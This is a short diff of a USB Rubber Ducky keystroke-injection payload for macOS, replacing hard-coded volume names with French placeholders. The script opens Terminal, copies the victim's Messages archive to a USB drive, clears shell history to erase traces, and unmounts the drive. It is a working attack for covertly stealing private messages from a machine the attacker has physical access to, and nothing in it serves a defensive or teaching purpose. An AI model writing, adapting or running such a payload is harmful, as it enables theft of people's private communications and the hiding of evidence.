@@ -6,11 +6,11 @@ DELAY 150
 STRING Terminal
 ENTER
 DELAY 300
-STRING cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/
+STRING cp -r ~/Library/Messages/Archive /Volumes/[NOM DU VOLUME USB]/[NOM DU FICHIER D'ENREGISTREMENT]
 ENTER
 STRING history -c
 ENTER
-STRING diskutil umount /Volumes/RubberDucky
+STRING diskutil umount /Volumes/[NOM DU VOLUME USB]
 ENTER
 DELAY 500
 STRING history -c
